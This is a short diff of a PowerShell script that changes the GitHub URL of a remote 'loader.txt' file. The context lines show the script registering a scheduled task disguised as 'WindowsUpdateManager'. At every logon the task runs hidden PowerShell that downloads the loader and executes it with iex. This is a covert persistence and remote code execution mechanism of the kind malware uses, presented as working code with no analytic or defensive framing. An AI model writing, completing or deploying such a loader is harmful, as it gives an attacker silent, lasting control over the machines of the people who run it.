@@ -59,7 +59,7 @@ function Install-And-Run-System {
     try {
         $taskName = "WindowsUpdateManager"
         # FIXED: ใช้ raw URL สำหรับ loader ด้วย
-        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt"
         
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
         $trigger = New-ScheduledTaskTrigger -AtLogon
